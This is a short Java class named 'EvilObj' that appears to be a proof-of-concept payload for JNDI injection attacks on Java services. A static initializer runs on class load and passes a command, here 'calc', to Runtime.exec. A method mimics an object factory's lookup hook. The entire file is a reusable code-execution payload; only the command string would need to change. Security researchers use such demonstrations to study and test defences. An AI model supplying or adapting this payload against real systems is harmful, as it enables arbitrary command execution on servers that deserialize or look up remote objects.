package fun.gengzi.algorithm;

import javax.lang.model.element.Name;

import javax.naming.Context;

import java.io.BufferedInputStream;

import java.io.BufferedReader;

import java.io.IOException;

import java.io.InputStreamReader;

import java.util.HashMap;


public class EvilObj {

    public static void exec(String cmd) throws IOException {
        String sb = "";
        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader inBr = new BufferedReader(new InputStreamReader(bufferedInputStream));
        String lineStr;
        while ((lineStr = inBr.readLine()) != null) {
            sb += lineStr + "\n";
        }
        inBr.close();
        inBr.close();
    }


    public Object getObjectInstance(Object obj, Name name, Context context, HashMap<?, ?> environment) throws Exception {
        return null;
    }


    static {
        try {
            System.out.println("hhhh");
            exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}